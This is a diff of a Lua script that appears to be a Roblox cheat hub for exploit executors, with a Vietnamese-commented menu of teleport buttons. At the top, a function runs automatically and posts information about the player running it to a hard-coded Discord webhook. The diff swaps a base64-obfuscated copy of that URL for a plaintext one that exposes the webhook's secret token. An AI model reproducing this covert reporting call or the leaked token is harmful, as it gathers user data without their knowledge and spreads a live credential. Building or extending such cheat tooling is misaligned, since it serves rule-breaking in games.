@@ -28,34 +28,18 @@ local function sendWebhook(p, whitelisted)
                          "\n**Note:** " .. noteText,
             color = colorCode
         }}
-    })
-local function decodeBase64(str)
-    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    str = str:gsub('[^'..b64chars..'=]', '')
-    local temp = {}
-    for i = 1, #str, 4 do
-        local a, b, c, d = str:byte(i, i+3)
-        a = b64chars:find(a and string.char(a)) - 1
-        b = b64chars:find(b and string.char(b)) - 1
-        c = b64chars:find(c and string.char(c)) - 1
-        d = b64chars:find(d and string.char(d)) - 1
-        temp[#temp+1] = string.char((a * 4 + math.floor(b / 16)) % 256)
-        if c then temp[#temp+1] = string.char((b * 16 + math.floor(c / 4)) % 256) end
-        if d then temp[#temp+1] = string.char((c * 64 + d) % 256) end
-    end
-    return table.concat(temp)
-end
-
+    }) 
 local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
-if request then
-    request({
-        Url = decodeBase64("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0MDQwODAzOTUxMjkwNjU0OTIvMkp1ay1sUko5M29PZjMwczR4ek11XzFoeVlaeUtOTXVzR0cwekhQTTFQb2N3T1NHa0FhaERsVk5CYUJvZ054N0V3V0U="),
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = jsonData
-    })
-else
-    warn("Executor không hỗ trợ HTTP Request. Không thể gửi webhook.")
+    if request then
+        request({
+            Url = "https://canary.discord.com/api/webhooks/1404080395129065492/2Juk-lRJ93oOf30s4xzMu_1hzYZuKNMusGG0zHPM1PocwOSGkAahDlVNBaBogNx7EwWE",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = jsonData
+        })
+    else
+        warn("Executor không hỗ trợ HTTP Request. Không thể gửi webhook.")
+    end
 end
 sendWebhook(player, true)
 -- ================= WINDUI BOILERPLATE (bỏ qua nếu đã có) =================
@@ -162,7 +146,6 @@ local Section3 = Window:Section({
     Icon = "",
     Opened = false,
 })
-
 
 local Tab6 = Section3:Tab({
     Title = "Sea 1",
@@ -587,7 +570,6 @@ end
         print("clicked")
     end
 })
-
 local Button = Tab1:Button({
     Title = "Random Secret(sea 1)",
     Desc = "chỉ là 1 cái nút",
@@ -1098,7 +1080,6 @@ game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-683.979
         print("clicked")
     end
 })
-
 local Button = Tab7:Button({
     Title = "đảo platinum",
     Desc = "",
@@ -1406,4 +1387,4 @@ button.MouseButton1Click:Connect(function()
 			Window:Close()
 		end
 	end
-end)
+end) 
